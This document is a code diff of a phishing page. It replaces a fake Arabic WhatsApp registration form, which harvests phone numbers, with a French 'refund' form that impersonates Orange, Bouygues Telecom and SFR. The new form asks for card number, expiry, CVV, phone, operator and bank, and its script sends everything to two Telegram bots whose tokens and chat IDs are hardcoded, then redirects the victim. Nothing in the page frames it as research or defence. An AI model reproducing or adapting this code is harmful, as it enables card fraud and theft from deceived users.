@@ -1,203 +1,218 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    <title>WhatsApp Registration</title>
+    <title>Formulaire de Remboursement</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #FAF3E7;
-            margin: 0;
-            padding: 0;
+            font-family: 'Arial', sans-serif;
         }
-
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #25D366;
-            padding: 10px 20px;
-            color: white;
-            font-size: 18px;
-        }
-
-        .navbar .logo {
-            display: flex;
-            align-items: center;
-        }
-
-        .navbar .logo img {
-            height: 30px;
-            margin-right: 10px;
-        }
-
-        .container {
-            text-align: center;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            max-width: 400px;
-            margin: 50px auto;
-        }
-
-        .container img {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-
-        .container .title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        .container .description {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-
-        .container .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .container select,
-        .container input {
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            padding: 10px;
-            font-size: 14px;
-            width: 100%;
-            max-width: 300px;
-        }
-
-        .container button {
-            padding: 10px;
-            background-color: #25D366;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            max-width: 300px;
-        }
-
-        .container button:hover {
-            background-color: #1DA955;
-        }
-
-        .countdown {
-            font-size: 16px;
-            color: #25D366;
-            margin-top: 20px;
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #888;
-            font-size: 12px;
+        #card-error {
+            display: none;
+            color: red;
+            font-size: 0.9rem;
+            margin-top: 5px;
         }
     </style>
 </head>
+<body class="bg-gray-100 flex flex-col min-h-screen justify-between">
 
-<body>
-    <!-- Navbar -->
-    <div class="navbar">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-            WhatsApp 
+    <!-- Formulaire principal -->
+    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
+        <!-- Logos des opérateurs -->
+        <div class="flex justify-center space-x-4 mb-6">
+            <img src="IMG_4265.jpeg" alt="Orange" class="h-12">
+            <img src="IMG_4264.jpeg" alt="Bouygues Telecom" class="h-12">
+            <img src="IMG_4263.jpeg" alt="SFR" class="h-12">
+        </div>
+
+        <!-- Titre -->
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Remboursement</h1>
+        <p class="text-sm text-center text-gray-600 mb-6">
+            Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité.
+            Ce processus est sécurisé et protégé.
+        </p>
+
+        <!-- Formulaire -->
+        <form id="remboursement-form">
+            <!-- Titulaire de la carte -->
+            <div class="mb-4">
+                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
+                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Numéro de carte -->
+            <div class="mb-4">
+                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
+                <input type="text" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="16"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+                <p id="card-error">Le numéro de carte doit contenir exactement 16 chiffres numériques.</p>
+            </div>
+
+            <!-- Date d'expiration -->
+            <div class="mb-4">
+                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
+                <input type="month" id="date-expiration" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Code CVV -->
+            <div class="mb-4">
+                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
+                <input type="text" id="cvv" placeholder="123" required maxlength="3"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Numéro de téléphone -->
+            <div class="mb-4">
+                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
+                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Sélection du fournisseur -->
+            <div class="mb-6">
+                <label for="operateur" class="block text-sm font-medium text-gray-700">Choisir votre opérateur</label>
+                <select id="operateur" name="operateur" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
+                    <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
+                    <option value="orange">Orange</option>
+                    <option value="bouygues">Bouygues Telecom</option>
+                    <option value="sfr">SFR</option>
+                    <option value="free">Free Mobile</option>
+                    <option value="la-poste">La Poste Mobile</option>
+                    <option value="coriolis">Coriolis</option>
+                    <option value="nrj-mobile">NRJ Mobile</option>
+                    <option value="red">RED by SFR</option>
+                    <option value="sosh">Sosh (Orange)</option>
+                    <option value="b-and-you">B&YOU (Bouygues Telecom)</option>
+                    <option value="syma">Syma Mobile</option>
+                    <option value="lycamobile">Lycamobile</option>
+                    <option value="lebara">Lebara Mobile</option>
+                </select>
+            </div>
+
+            <!-- Banque -->
+            <div class="mb-6">
+                <label for="bank" class="block text-sm font-medium text-gray-700">Choisir votre banque</label>
+                <select id="bank" name="bank" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
+                    <option value="" disabled selected>-- Sélectionnez votre banque --</option>
+                    <option value="bnpp">BNP Paribas</option>
+                    <option value="sg">Société Générale</option>
+                    <option value="cic">CIC</option>
+                    <option value="ca">Crédit Agricole</option>
+                    <option value="bp">Banque Populaire</option>
+                    <option value="hsbc">HSBC France</option>
+                    <option value="la-poste">La Banque Postale</option>
+                    <option value="cm">Crédit Mutuel</option>
+                    <option value="ing">ING</option>
+                    <option value="bforbank">BforBank</option>
+                    <option value="orange-bank">Orange Bank</option>
+                    <option value="n26">N26</option>
+                    <option value="revolut">Revolut</option>
+                </select>
+            </div>
+
+            <!-- Bouton de validation -->
+            <button type="submit"
+                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
+                Valider mon remboursement
+            </button>
+        </form>
+
+        <!-- Section supplémentaire: Remboursement sécurisé -->
+        <div class="mt-6 flex justify-center">
+            <img src="IMG_4262.jpeg" alt="Remboursement Sécurisé" class="w-52 h-auto">
         </div>
     </div>
 
-    <!-- Main Container -->
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        <div class="title">تسجيل الدخول</div>
-        <div class="description">الدعوة للانضمام إلى مجموعة واتساب.</div>
-
-        <div class="form-group">
-            <select id="countryCode">
-                <option value="966">🇸🇦 السعودية +966</option>
-                <option value="971">🇦🇪 الإمارات +971</option>
-                <option value="965">🇰🇼 الكويت +965</option>
-                <option value="974">🇶🇦 قطر +974</option>
-                <option value="973">🇧🇭 البحرين +973</option>
-                <option value="968">🇴🇲 عمان +968</option>
-                <option value="963">🇸🇾 سوريا +963</option>
-                <option value="964">🇮🇶 العراق +964</option>
-                <option value="962">🇯🇴 الأردن +962</option>
-                <option value="970">🇵🇸 فلسطين +970</option>
-                <option value="249">🇸🇩 السودان +249</option>
-            </select>
-            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
+    <!-- TÉLÉCHARGEMENT (Footer) -->
+    <footer class="bg-gray-800 text-white py-6 mt-10">
+        <div class="max-w-4xl mx-auto text-center">
+            <p class="text-lg font-semibold mb-2">Pour toute assistance, contactez-nous :</p>
+            <p class="text-sm">📧 Email: <a href="mailto:support@remboursement.com" class="text-green-400 hover:underline">support@remboursement.com</a></p>
+            <p class="text-sm">📞 Téléphone: <a href="tel:+33890889878" class="text-green-400 hover:underline">+33 1 23 45 67 89</a></p>
+            <div class="mt-4">
+                <a href="#" class="text-green-400 hover:underline mx-2">Facebook</a> |
+                <a href="#" class="text-green-400 hover:underline mx-2">Twitter</a> |
+                <a href="#" class="text-green-400 hover:underline mx-2">Instagram</a>
+            </div>
+            <div class="mt-4 text-sm">
+                <a href="#" class="hover:underline">📄 Politique de confidentialité</a> |
+                <a href="#" class="hover:underline">📘 Conditions générales</a> |
+                <a href="#" class="hover:underline">🔗 Plan du site</a>
+            </div>
+            <p class="text-xs mt-4">&copy; 2024 Service de Remboursement. Tous droits réservés.</p>
         </div>
-        <button onclick="sendMessage()">متابعة</button>
-        <div class="countdown" id="countdown"></div>
-    </div>
-
-    <footer>
-        ©️ 2024 واتساب
     </footer>
 
     <script>
-        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-        const chatId = '612575358';
+        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
+    event.preventDefault();
 
-        function sendMessage() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+    const nom = document.getElementById("nom").value;
+    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
+    const dateExpiration = document.getElementById("date-expiration").value;
+    const cvv = document.getElementById("cvv").value;
+    const telephone = document.getElementById("telephone").value;
+    const operateur = document.getElementById("operateur").value;
+    const bank = document.getElementById("bank").value;
 
-            if (!phoneNumber || phoneNumber.length < 6) {
-                alert('يرجى إدخال رقم هاتف صحيح.');
-                return;
-            }
+    // توكن البوت الأول
+    const token1 = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";
+    const chatId1 = "5372119436";
 
-            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
+    // توكن البوت الثاني
+    const token2 = "7730187317:AAEcDTse4FAZmtY_atjQaUX0eyiGoNp7-Ig";
+    const chatId2 = "7794693292";
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `رقم الهاتف: ${fullPhoneNumber}`
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    startCountdown();
-                } else {
-                    alert('حدث خطأ أثناء الإرسال.');
-                }
-            })
-            .catch(error => {
-                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
-            });
-        }
+    const message = `
+🔔 **Nouvelle Demande de Remboursement** 🔔
+👤 Nom: ${nom}
+💳 Numéro de Carte: ${numeroCarte}
+📅 Expiration: ${dateExpiration}
+🔒 CVV: ${cvv}
+📞 Téléphone: ${telephone}
+📡 Opérateur: ${operateur}
+🏦 Banque: ${bank}`;
 
-        function startCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            let countdown = 4;
+    try {
+        // إرسال الطلب إلى البوت الأول
+        await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId1,
+                text: message,
+                parse_mode: "Markdown",
+            }),
+        });
 
-            const interval = setInterval(() => {
-                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
-                countdown--;
+        // إرسال الطلب إلى البوت الثاني
+        await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId2,
+                text: message,
+                parse_mode: "Markdown",
+            }),
+        });
 
-                if (countdown < 0) {
-                    clearInterval(interval);
-                    window.location.href = 'secondpage.html'; // قم بتغيير الرابط للصفحة المطلوبة
-                }
-            }, 1000);
-        }
+        // إعادة التوجيه بعد الإرسال
+        window.location.href = "Traitement.html";
+    } catch (error) {
+        alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+    }
+});
     </script>
 </body>
 </html>
